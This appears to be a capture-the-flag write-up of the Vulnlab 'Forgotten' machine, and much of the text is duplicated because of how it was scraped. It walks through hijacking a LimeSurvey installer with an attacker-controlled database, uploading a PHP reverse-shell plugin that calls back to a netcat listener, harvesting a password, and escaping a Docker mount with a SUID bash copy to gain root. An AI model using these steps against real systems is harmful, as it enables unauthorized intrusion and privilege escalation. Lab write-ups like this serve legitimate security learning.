this, LimeSurvey will tell us that our plugin is incompatible when we attempt to upload it. This is within the `<compatibility>` subcategory within the xml file.\n\n`<version>6.3.7</version>`\n\nAfterwards, let's start a netcat reverse shell to listen on our attack machine so we can receive a callback when the reverse shell is executed.\n\n`nc -lvnp 9001`\n\nFinally, let's compress the two files to a zip archive and prepare to send it in to LimeSurvey.\n\n`zip Y1LD1R1M.zip config.xml php-rev.php`\n\nWe can now upload our archive to the LimeSurvey `Plugins` panel, as denoted below.\n\n![](/images/vulnlab/forgotten-vl/g.jpg)\n\nIf we have performed all the steps prior correctly, LimeSurvey will allow us to install the plugin after this page.\n\nThe plugin can now be accessed at `http://10.10.113.195/survey/upload/plugins/Y1LD1R1M/php-rev.php`.\n\nAccessing this will execute our reverse shell and generate a session for us through netcat as the `limesvc` user.\n\n![](/images/vulnlab/forgotten-vl/h.jpg)\n\n# Host Reconnaissance\n\nNow that we are on the system and have successfully exploited the web-application, though you'll find that there is no user flag.\n\nThis was relatively confusing, as I looked within the Wiki and found that there was indeed a user flag that was present on the machine.\n\nTo make our enumeration a little easier, I uploaded the `Linpeas` script which you can find [here](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). `Linpeas` will essentially enumerate the entire filesystem and return and pertinent information it finds for us.\n\nAfter running the `Linpeas` script on the remote machine, you'll find in it's output that there is an environment variable set that lists the password of the user through SSH.\n\n`LIMESURVEY_PASS=[...snip...]`\n\nAlso, you'll notice that there are a large amount of docker settings and configurations present on the machine, making me assume that we're currently in a docker container.\n\n```\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/docker/overlay2/l/P5AO7VJP3KS26RV7L4G4A3CQMO:/var/lib/docker/overlay2/l/DUMS4MOPBZYYCT5MLU3KOIHV67:/var/lib/docker/overlay2/l/E6PFD55HUOLSDVI5HFVSG2MKY6:/var/lib/docker/overlay2/l/F2C2GU57ABILW44DR6N7IOAS2U:/var/lib/docker/overlay2/l/MTDNHTDTAHLYFOE23OONITLATE:/var/lib/docker/overlay2/l/HVR5FUOEP75JC4WLOLQCLICZW5:/var/lib/docker/overlay2/l/45JVDGBN2HJGR4ZFC56CA3QEFE:/var/lib/docker/overlay2/l/BLHTPLHTIDJITGF5LG7NDGIHIQ:/var/lib/docker/overlay2/l/ON6NXIXZRZZCFUPSYDLFPND5XG:/var/lib/docker/overlay2/l/URCYD6PEIO427ROGBDDSPOX7X4:/var/lib/docker/overlay2/l/TKNY7I37KDSR7UM34B7EAJWLEX:/var/lib/docker/overlay2/l/NI6IE4U3RKI3MI3XAZ7VSTRT5U:/var/lib/docker/overlay2/l/R2CP4KV5O4GJ4TW3FS73ARJZUR:/var/lib/docker/overlay2/l/JENNFERKWWS2TYSPK7WT7IGYT4:/var/lib/docker/overlay2/l/MMP56DFNWIP27YOKHUYTI3CVJ4:/var/lib/docker/overlay2/l/UBBT3YOEP4MEDPPJR5X4D474QX:/var/lib/docker/overlay2/l/ZHODKFSJJ4IAMIIQW7GBHG5QA3:/var/lib/docker/overlay2/l/WHNHWNHOFTA3DGNRVL3B3MMNY6:/var/lib/docker/overlay2/l/TQ6Z55HNEUJUXYWNUWJ4E5BLR3:/var/lib/docker/overlay2/l/UVBX7ES72OROVYQQPYGPTEIA4D:/var/lib/docker/overlay2/l/HCBBV74XSEA5GRAMKLUM7VELUP:/var/lib/docker/overlay2/l/VNQTVVELYXHIW5JNA2W7VHHGHA,upperdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/diff,workdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/work,nouserxattr)\n/etc/apache2/conf-available/docker-php.conf-<FilesMatch \\.php$>\n/etc/apache2/conf-available/docker-php.conf:\tSetHandler application/x-httpd-php\n/etc/apache2/conf-enabled/docker-php.conf-<FilesMatch \\.php$>\n/etc/apache2/conf-enabled/docker-php.conf:\tSetHandler application/x-httpd-php\n2023-12-02+15:30:12.4134549900 /.dockerenv\n/.dockerenv\n```\n\nSince we technically have credentials to the machine, we could try using SSH and logging into the machine. To my surprise, this worked and we can find a usable user.txt flag within the home directory of the `limesvc` user.\n\n![](/images/vulnlab/forgotten-vl/i.jpg)\n\nNow that we have the user flag, we can continue to enumerate for privilege escalation.\n\n# Docker Breakout Privilege Escalation\n\nWe can run `sudo -l` with the user's password to determine any privileges that we have as this user. Unfortunately, this does not return any valid results as `user limesvc may not run sudo`.\n\nWe'll need to find another way for privilege escalation aside from privileges. Since we had to breakout of a docker container earlier, we can try and see if there's an additional privilege escalation vector we can potentially do on the machine in order to gain `root`.\n\nOne of the common vectors of attack through docker breakouts is utilizing mounts. Mounts essentially allow you to exchange or download files to and from the respective client machine (whether that be the docker container or the actual host itself). I had to exploit this through an NFS share on my Hybrid writeup. It involved us having to view the NFS read/write permissions on the share that was mounted, write a file to it, and then copy the permissions to the binary before running it as another user. While this was relatively easy to view the permissions via the NFS share, this is a different story with docker containers.\n\nA great solution to visualize the permissions for mounts on a docker container is by utilizing [CDK](https://github.com/cdk-team/CDK), a toolset that was made to enumerate container capabilities. This will be helpful to run on the docker container, as it'll help us determine if there are any to exploit.\n\nNote that I uploaded the `CDK` binary through sliver, if you want to do it manually you can use `curl` with parameters `http://(IP):(PORT)/cdk_linux_amd64 -O cdk` and also stand up a simple Python HTTP server on your host (just as an example).\n\n```\n$ ./cdk_linux_amd64 evaluate --full > cdk.txt\n\nsliver> download cdk.txt\n```\n\nThis file has been downloaded on our host, and you'll see an output of capabilities printed to your screen when you try to read it. Let's focus on the `Mounts` section.\n\n```\n[  Information Gathering - Mounts  ]\n0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/doc\n\n[...snip...]\n\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n0:48 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /fs /proc/fs ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /irq /proc/irq ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /sys /proc/sys ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 /sysrq-trigger /proc/sysrq-trigger ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:53 / /proc/acpi ro,relatime - tmpfs tmpfs ro,inode64\n0:49 /null /proc/kcore rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:49 /null /proc/keys rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:49 /null /proc/timer_list rw,nosuid - tmpfs tmpfs rw,size=65536k,mode=755,inode64\n0:54 / /proc/scsi ro,relatime - tmpfs tmpfs ro,inode64\n0:55 / /sys/firmware ro,relatime - tmpfs tmpfs ro,inode64\n```\n\nWhile a lot of these don't seem very interesting, you'll notice that there's a mount pointing towards `/opt/limesurvey` on the host machine. We can confirm that this is a folder by checking through our SSH session on the host machine.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls\nLICENSE      admin        docs         installer  node_modules      psalm-all.xml     setdebug.php  upload\nREADME.md    application  gulpfile.js  locale     open-api-gen.php  psalm-strict.xml  themes        vendor\nSECURITY.md  assets       index.php    modules    plugins           psalm.xml         tmp\n```\n\nIt seems that the mount specifically is pointing towards `/dev/root`. While this is the location of the mount, the mount itself is pulling the contents of `/opt/limesurvey` to the `/dev/root` directory and can be modified through the docker container.\n\nThe location of the mount on our docker container that is connected to `/opt/limesurvey` is denoted as `/var/www/html/survey`, which is the base directory of the LimeSurvey service.\n\nSo the exploitation for this seems to be relatively simple. First since I didn't do it before, we'll login to the docker container as root due to the `limesvc` user's sudo privileges.\n\nIf you run into a `sudo` error that states you need a proper terminal to read the password, I would usually recommend just creating a proper shell with tools like Python or `stty`. The issue is that we're in a docker container and don't have access to either of those tools - thus I'd recommend using a C2 such as [Sliver](https://github.com/BishopFox/sliver) to have it create a proper terminal for you.\n\n```\nlimesvc@efaa6f5097ed:/home/limesvc$ sudo -l\n[sudo] password for limesvc: \nMatching Defaults entries for limesvc on efaa6f5097ed:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser limesvc may run the following commands on efaa6f5097ed:\n    (ALL : ALL) ALL\nlimesvc@efaa6f5097ed:/home/limesvc$\n\nlimesvc@efaa6f5097ed:/home/limesvc$ sudo su\nroot@efaa6f5097ed:/home/limesvc# whoami\nroot\nroot@efaa6f5097ed:/home/limesvc#\n```\n\n# Exploiting Mounted Root-SUID Binary\n\nSo just a brief snippet of how sudo privileges work, our `root` user has an ID value of 0, in which every default root user will have this privilege ID value set. Our `limesvc` on our SSH user does not have this ID set to them, and is not allowed to run any values within the context of root.\n\nHowever, we do have the privileges of root within our docker container and a way to transfer this file to our host machine. Thus, if we are able to change the contents of a shell binary in our docker container, have it adopt the privileges of root, and adjust the SUID bit of the binary - we should be able to escalate our privileges.\n\nSo first we'll copy the `/bin/bash` binary in our docker container to the mounted directory `/var/www/html/survey`. I'll also rename the binary to `./daz`.\n\n`root@efaa6f5097ed:/var/www/html/survey# cp /bin/bash ./daz`\n\nWe'll then adjust the SUID bit of the binary using `chmod`. As context as to what this does - we're essentially saying to allow all users to be able to run this binary in the context of the root user. That means ANY user will be able to run this as root.\n\n`root@efaa6f5097ed:/var/www/html/survey# chmod u+s ./daz`\n\nNow, we should be able to go back to our SSH session and verify that the file is there.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz\n-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz\n```\n\nYou'll see now that this file is owned by root, but we'll still be able to run it as our current user. If we run it with the `-p` option (which stands for privileged mode), it should generate a session for us as root.\n\n```\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ls -la | grep daz\n-rwsr-xr-x   1 root    root    1234376 May 15 21:06 daz\nlimesvc@ip-10-10-200-233:/opt/limesurvey$ ./daz -p\ndaz-5.1# whoami\nroot\ndaz-5.1#\n```\n\nAnd that's it! The root flag is within `/root/root.txt`, and thus we have completed this machine.\n\n# Conclusion\n\nBig thanks to xct for creating this machine, it was very fun and helped strengthen some post-exploitation methodologies that I had experienced briefly in the past. The LimeSurvey installation was also really interesting and helped with some brainstorming into the attack path.\n\n# Resources\n\nhttps://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\nhttps://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B\nhttps://github.com/Y1LD1R1M-1337/Limesurvey-RCE\nhttps://github.com/peass-ng/PEASS-ng/tree/master/linPEAS\nhttps://github.com/cdk-team/CDK\nhttps://github.com/BishopFox/sliver","source":"_posts/forgotten.md","raw":"---\ntitle: Forgotten - Vulnlab\ndate: 2024-06-05 02:12:54\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux'\ndescription: This machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.\ncover: /images/vulnlab/forgotten-vl/forgotten_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nThis machine was relatively fun, as it involved progressing through the installation of an unused web-application - which we will then exploit. Big props to xct for creating this machine, as I thought it was great learning material and fun to exploit.\n\n# Enumeration\n\nLet's start with our usual NMAP scan to see what ports are open.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 21:55 EDT\nNmap scan report for 10.10.113.195\nHost is up (0.11s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 25:94:a4:a0:85:b6:06:ae:b3:7b:5e:45:c1:b6:32:b5 (ECDSA)\n|_  256 22:d1:a0:9e:e2:58:92:d3:7b:9d:86:0f:04:28:8c:65 (ED25519)\n80/tcp open  http    Apache httpd 2.4.56\n|_http-server-header: Apache/2.4.56 (Debian)\n|_http-title: 403 Forbidden\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 22/tcp)\nHOP RTT       ADDRESS\n1   99.64 ms  10.8.0.1\n2   102.00 ms 10.10.113.195\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 42.32 seconds\n```\n\nI see a lot of these on HTB, so I'm relatively used to seeing just port 22 (SSH) and port 80 (HTTP) open. Nonetheless let's see specifically what's running on the web server.\n\n![](/images/vulnlab/forgotten-vl/b.jpg)\n\nThis is interesting, as immediately the moment we try to access the base link for the website, it says we do not have access to the resource. At this point, I'm assuming that we are guaranteed to find subdirectories from a `gobuster` scan, since we have no other resources to access at this point.\n`gobuster dir -u http://10.10.113.195/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`\n\nUpon a brief few seconds of scanning, we are greeted with a 301 redirect to `/survey`.\n\n```\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/survey               (Status: 301) [Size: 315] [--> http://10.10.113.195/survey/]\n/server-status        (Status: 403) [Size: 278]\nProgress: 220560 / 220561 (100.00%)\n===============================================================\nFinished\n===============================================================\n```\n\nUpon accessing the redirect, we are brought to an installation page for `LimeSurvey`.\n\n# Exploiting Limesurvey Installation\n\nBased off some research, it seems as though LimeSurvey is an open-source survey application that is used to develop online surveys and quizzes for its audience. It's primarily built up in PHP and utilizes SQL database applications such as MySQL, PostgreSQL, or even the Windows alternative of MSSQL.\n\nThis specific product seems to be marketed towards researchers, universities, web developers and students alike.\n\n![](/images/vulnlab/forgotten-vl/b_1.jpg)\n\nI researched into a few CVEs for LimeSurvey 6.3.7, however there wasn't much that I could find regarding our specific instance of it. Most of the CVEs related to versions 5.0, 3.0, and a few versions in between.\n\nNonetheless, we can progress with the installation, so we'll continue to do that until something particularly interesting comes up.\n\nI've listed my thoughts on each section of the installation page below in the form of a list and what I think we could potentially accomplish.\n\n1. Welcome -> Contains Language selection and `installation start` option.\n2. License -> Regulatory information, nothing out of the ordinary.\n3. Pre-installation Check -> Contains vital information regarding the services used for this LimeSurvey instance.\n\nI'd like to point out something interesting - it seems as though a MySQL database option is present within the pre-installation check. That being said, we could not see one on the frontend of the server (based off our NMAP scan), nor is the option checked off within this screen.\n\nThe other information on this page does not seem to be as important, as the PHP version does not seem to be exploitable to my awareness.\n\n4. Configuration -> Main attack path concern, allows us to configure various parts of the application - namely the database.\n\nAs explained previously, this section of the installation page seemed odd at first glance as it allows us to configure the MySQL database association with our LimeSurvey instance.\n\n5. Database settings -> Unconfigurable until database configuration is completed.\n6. Administrator settings -> Unconfigurable until database configuration is completed.\n\nAs I explained previously, the database configuration portion of the installation seems the most interesting. The particular section within this page that I'm referring to is the `Database location` section, which is seemingly allowing us to allocate an IP address of a database to the LimeSurvey instance.\n\n![](/images/vulnlab/forgotten-vl/c.jpg)\n\nWhile this is preset to `localhost`, I don't see any reason as to why we couldn't alter this to potentially point somewhere else - such as to our own machine.\n\n# Local MySQL Configuration\n\nSo with that in mind, let's try to set up our own MySQL database server within our attack machine. https://www.geeksforgeeks.org/mysql-in-kali-linux-command-line/\n\n```\ndaz@daz$ sudo apt install mariadb-server\n\ndaz@daz$ sudo systemctl start mysql\n\ndaz@daz$ sudo service mysql status\n● mariadb.service - MariaDB 10.11.6 database server\n     Loaded: loaded (/usr/lib/systemd/system/mariadb.service; disabled; preset: disabled)\n     Active: active (running) since Tue 2024-05-14 22:52:07 EDT; 1min 36s ago\n     [...snip...]\n\ndaz@daz$ sudo mysql\n```\n\nSo we'll need to specify a user to authenticate as for our particular case, which I used this [article](https://www.strongdm.com/blog/mysql-create-user-manage-access-privileges-how-to#:~:text=Create%20a%20new%20MySQL%20user%20account&text=To%20create%20a%20new%20user,localhost'%20IDENTIFIED%20BY%20'password'%3B) on StrongDM to help with.\n\nI'll outline the steps we need to take in order to create a database and set up the necessary privileges to a user for our LimeSurvey installation.\n\nFirst we'll need to create a database to use, since LimeSurvey requires a `Database name` to be supplied with the installation.\n\n```\nMariaDB [(none)]> CREATE DATABASE limesurvey;\nQuery OK, 1 row affected (0.001 sec)\n```\n\nNext, we'll create a user under the alias `lime_user` who will have all of the necessary privileges to our setup.\n\n```\nMariaDB [(none)]> CREATE USER 'lime_user'@'%' IDENTIFIED by 'lime_user' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.006 sec)\n```\n\nNote that the `%` in our user creation query essentially acts as a wildcard for all interfaces.\n\nThe next concern we need to focus on is the specific privileges that our user has in relation to what we need for the setup. To any beginners, a MySQL privilege is essentially any ruleset or specified rule that a MySQL user has that regulates their actions on a database. This essentially restricts the user into performing various actions on the database based on the privileges they are given. This can be broken up into 4 different types of privileges:\n\n**Global Privileges**: These privileges apply to every database on the hosted server. By default, administrative privileges will fall into this category as they enable a user to perform operations that are relative to a specific database.\n**Database Privileges**: As expected in the name, these privileges apply solely to specified databases and all objects within those databases (i.e. columns, tables, entries, etc.).\n**Proxy Privileges**: These allow a user to act in the context of other users and adopt their same privileges within the space of the situation they are involved in.\n**Object Privileges**: These privileges apply solely to the types of objects stored in a database and can be granted between a set of objects if needed.\n\nIn a red-teaming environment such as an enterprise infrastructure, we'd want to create a user that looks relatively normal and in-line with regular options as not to arise suspicious. We can do this by delegating specific privileges to them such as `INSERT` or `ALTER` dependent on what is needed for the setup.\n\nHowever this won't be the case for our situation, so we can grant them `ALL PRIVILEGES` so they can perform any actions needed.\n\n```\nMariaDB [(none)]> GRANT ALL ON *.* TO 'lime_user'@'%' WITH GRANT OPTION;\nQuery OK, 0 rows affected (0.006 sec)\n```\n\nNote that we're essentially saying that our username/password is `lime_user:lime_user` with the above query.*\n\nWe can confirm that our privileges have been granted to the specific user with the below query.\n\n```\nMariaDB [(none)]> SHOW GRANTS for 'lime_user'@'%';\n+-------------------------------------------------------------------------------------------------------------------------------------+\n| Grants for lime_user@%                                                                                                              |\n+-------------------------------------------------------------------------------------------------------------------------------------+\n| GRANT ALL PRIVILEGES ON *.* TO `lime_user`@`%` IDENTIFIED BY PASSWORD '*0F1EF1AB79F549AD4FE495927D8C200E7413BD85' WITH GRANT OPTION |\n+-------------------------------------------------------------------------------------------------------------------------------------+\n1 row in set (0.000 sec)\n```\n\n\nAnother thing we'll also need to do is configure the bind address for our MySQL server. By default, it's meant to listen solely on localhost as it acts as a backend server.\n\nWe can do this by editing `/etc/mysql/mariadb.conf.d/50-server.cnf` and changing the `bind-address` to `0.0.0.0` to listen on all interfaces.\n\nThis should allow the remote configuration to access our MySQL server and populate any fields needed. We can then restart our MySQL server with `sudo systemctl restart mysql`\n\nWe'll also need flush all of our privileges to ensure that they are configured correctly.\n\n```\nMariaDB [(none)]> FLUSH PRIVILEGES;\nQuery OK, 0 rows affected (0.001 sec)\n```\n\n# Redirecting Database Configuration to Local MySQL\n\nWith that, our backend database configuration should be finished and ready for the LimeSurvey setup. We'll fill in the necessary parameters into the configuration page and hope for any progress.\n\n![](/images/vulnlab/forgotten-vl/d.jpg)\n\nIf we have followed all the previous steps and select the `Next` button, we can see that we're greeted with a message that is asking us to populate the `limesurvey` database. It also tells us that the database already exists, since we've already created it the previous setup steps. We'll select `Populate database`.\n\nAfterwards, we're brought to an administration configuration, to which we can configure our admin credentials to just be `daz:daz` and just populate the rest with fake information.\n\n![](/images/vulnlab/forgotten-vl/e.jpg)\n\nIt then notifies us that our password has been confirmed and that it will allow us to authenticate to the administration panel. We'll select `Administration` to access this panel.*\n\nWe're brought to a login page, to which we can use the same credentials that we provided within the configuration portion of the setup.\n\n![](/images/vulnlab/forgotten-vl/f.jpg)\n\n# Limesurvey RCE\n\nWe're greeted with the LimeSurvey administration panel, which seems to have a lot of stuff from us to mess with. Upon first glance, I was immediately drawn into the `Plugin` and `Theme` functionalities within the `Configuration` tab, so we'll see if we can potentially upload anything for RCE.\n\nGenerally with web-applications like these, if we're allowed to upload a plugin, we can upload a malicious reverse shell and have it callback to our machine.\n\nThe resource we'll use to generate our reverse shell can be found [here](https://github.com/Y1LD1R1M-1337/Limesurvey-RCE).\n\nThe steps can be outlined below for how I used it, though you can also reference the README file within the repository on how to use it.\n\nFirstly, let's clone the repository with `git clone https://github.com/Y1LD1R1M-1337/Limesurvey-RCE.git`. This will clone the repository to our machine, to which we can use the files within it.\n\nAccording to the README, all that is required of us is to compress the `php-rev.php` and `config.xml` to a zip file and upload it as a plugin. There are a few prerequisites that we'll need to take into account in terms of file changes before sending the plugin into the server.\n\nFirst, let's change the `php-rev.php` IP address and port to point to a netcat reverse shell that we'll stand up on our attack machine in a few moments.\n\n`$ip = '10.8.0.173';`\n`$port = 9001;`\n\nNext, we'll need to change the `config.xml` to make it usable on our current LimeSurvey version. If we do not change this, LimeSurvey will tell us that our plugin is incompatible when we attempt to upload it. This is within the `<compatibility>` subcategory within the xml file.\n\n`<version>6.3.7</version>`\n\nAfterwards, let's start a netcat reverse shell to listen on our attack machine so we can receive a callback when the reverse shell is executed.\n\n`nc -lvnp 9001`\n\nFinally, let's compress the two files to a zip archive and prepare to send it in to LimeSurvey.\n\n`zip Y1LD1R1M.zip config.xml php-rev.php`\n\nWe can now upload our archive to the LimeSurvey `Plugins` panel, as denoted below.\n\n![](/images/vulnlab/forgotten-vl/g.jpg)\n\nIf we have performed all the steps prior correctly, LimeSurvey will allow us to install the plugin after this page.\n\nThe plugin can now be accessed at `http://10.10.113.195/survey/upload/plugins/Y1LD1R1M/php-rev.php`.\n\nAccessing this will execute our reverse shell and generate a session for us through netcat as the `limesvc` user.\n\n![](/images/vulnlab/forgotten-vl/h.jpg)\n\n# Host Reconnaissance\n\nNow that we are on the system and have successfully exploited the web-application, though you'll find that there is no user flag.\n\nThis was relatively confusing, as I looked within the Wiki and found that there was indeed a user flag that was present on the machine.\n\nTo make our enumeration a little easier, I uploaded the `Linpeas` script which you can find [here](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS). `Linpeas` will essentially enumerate the entire filesystem and return and pertinent information it finds for us.\n\nAfter running the `Linpeas` script on the remote machine, you'll find in it's output that there is an environment variable set that lists the password of the user through SSH.\n\n`LIMESURVEY_PASS=[...snip...]`\n\nAlso, you'll notice that there are a large amount of docker settings and configurations present on the machine, making me assume that we're currently in a docker container.\n\n```\noverlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/docker/overlay2/l/P5AO7VJP3KS26RV7L4G4A3CQMO:/var/lib/docker/overlay2/l/DUMS4MOPBZYYCT5MLU3KOIHV67:/var/lib/docker/overlay2/l/E6PFD55HUOLSDVI5HFVSG2MKY6:/var/lib/docker/overlay2/l/F2C2GU57ABILW44DR6N7IOAS2U:/var/lib/docker/overlay2/l/MTDNHTDTAHLYFOE23OONITLATE:/var/lib/docker/overlay2/l/HVR5FUOEP75JC4WLOLQCLICZW5:/var/lib/docker/overlay2/l/45JVDGBN2HJGR4ZFC56CA3QEFE:/var/lib/docker/overlay2/l/BLHTPLHTIDJITGF5LG7NDGIHIQ:/var/lib/docker/overlay2/l/ON6NXIXZRZZCFUPSYDLFPND5XG:/var/lib/docker/overlay2/l/URCYD6PEIO427ROGBDDSPOX7X4:/var/lib/docker/overlay2/l/TKNY7I37KDSR7UM34B7EAJWLEX:/var/lib/docker/overlay2/l/NI6IE4U3RKI3MI3XAZ7VSTRT5U:/var/lib/docker/overlay2/l/R2CP4KV5O4GJ4TW3FS73ARJZUR:/var/lib/docker/overlay2/l/JENNFERKWWS2TYSPK7WT7IGYT4:/var/lib/docker/overlay2/l/MMP56DFNWIP27YOKHUYTI3CVJ4:/var/lib/docker/overlay2/l/UBBT3YOEP4MEDPPJR5X4D474QX:/var/lib/docker/overlay2/l/ZHODKFSJJ4IAMIIQW7GBHG5QA3:/var/lib/docker/overlay2/l/WHNHWNHOFTA3DGNRVL3B3MMNY6:/var/lib/docker/overlay2/l/TQ6Z55HNEUJUXYWNUWJ4E5BLR3:/var/lib/docker/overlay2/l/UVBX7ES72OROVYQQPYGPTEIA4D:/var/lib/docker/overlay2/l/HCBBV74XSEA5GRAMKLUM7VELUP:/var/lib/docker/overlay2/l/VNQTVVELYXHIW5JNA2W7VHHGHA,upperdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/diff,workdir=/var/lib/docker/overlay2/1a43e7d4669803c0891d7262954f27e54c5528c77990d3da808fa53d6b67ccdf/work,nouserxattr)\n/etc/apache2/conf-available/docker-php.conf-<FilesMatch \\.php$>\n/etc/apache2/conf-available/docker-php.conf:\tSetHandler application/x-httpd-php\n/etc/apache2/conf-enabled/docker-php.conf-<FilesMatch \\.php$>\n/etc/apache2/conf-enabled/docker-php.conf:\tSetHandler application/x-httpd-php\n2023-12-02+15:30:12.4134549900 /.dockerenv\n/.dockerenv\n```\n\nSince we technically have credentials to the machine, we could try using SSH and logging into the machine. To my surprise, this worked and we can find a usable user.txt flag within the home directory of the `limesvc` user.\n\n![](/images/vulnlab/forgotten-vl/i.jpg)\n\nNow that we have the user flag, we can continue to enumerate for privilege escalation.\n\n# Docker Breakout Privilege Escalation\n\nWe can run `sudo -l` with the user's password to determine any privileges that we have as this user. Unfortunately, this does not return any valid results as `user limesvc may not run sudo`.\n\nWe'll need to find another way for privilege escalation aside from privileges. Since we had to breakout of a docker container earlier, we can try and see if there's an additional privilege escalation vector we can potentially do on the machine in order to gain `root`.\n\nOne of the common vectors of attack through docker breakouts is utilizing mounts. Mounts essentially allow you to exchange or download files to and from the respective client machine (whether that be the docker container or the actual host itself). I had to exploit this through an NFS share on my Hybrid writeup. It involved us having to view the NFS read/write permissions on the share that was mounted, write a file to it, and then copy the permissions to the binary before running it as another user. While this was relatively easy to view the permissions via the NFS share, this is a different story with docker containers.\n\nA great solution to visualize the permissions for mounts on a docker container is by utilizing [CDK](https://github.com/cdk-team/CDK), a toolset that was made to enumerate container capabilities. This will be helpful to run on the docker container, as it'll help us determine if there are any to exploit.\n\nNote that I uploaded the `CDK` binary through sliver, if you want to do it manually you can use `curl` with parameters `http://(IP):(PORT)/cdk_linux_amd64 -O cdk` and also stand up a simple Python HTTP server on your host (just as an example).\n\n```\n$ ./cdk_linux_amd64 evaluate --full > cdk.txt\n\nsliver> download cdk.txt\n```\n\nThis file has been downloaded on our host, and you'll see an output of capabilities printed to your screen when you try to read it. Let's focus on the `Mounts` section.\n\n```\n[  Information Gathering - Mounts  ]\n0:45 / / rw,relatime - overlay overlay rw,lowerdir=/var/lib/docker/overlay2/l/53HNCQFKU7UT4MRNHXETIEU7PS:/var/lib/docker/overlay2/l/EC46IKT2LF6IUMTKX5EYK6Y6NS:/var/lib/docker/overlay2/l/AVXFR7EGT4F5744IOUZXTAPAXP:/var/lib/doc\n\n[...snip...]\n\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hostname /etc/hostname rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /var/lib/docker/containers/efaa6f5097edd5289e5af809a8885d4eae195426317ee5cdba47c1ff7c1ca68d/hosts /etc/hosts rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n259:1 /opt/limesurvey /var/www/html/survey rw,relatime - ext4 /dev/root rw,discard,errors=remount-ro\n0:48 /bus /proc/bus ro,nosuid,nodev,noexec,relatime - proc proc rw\n0:48 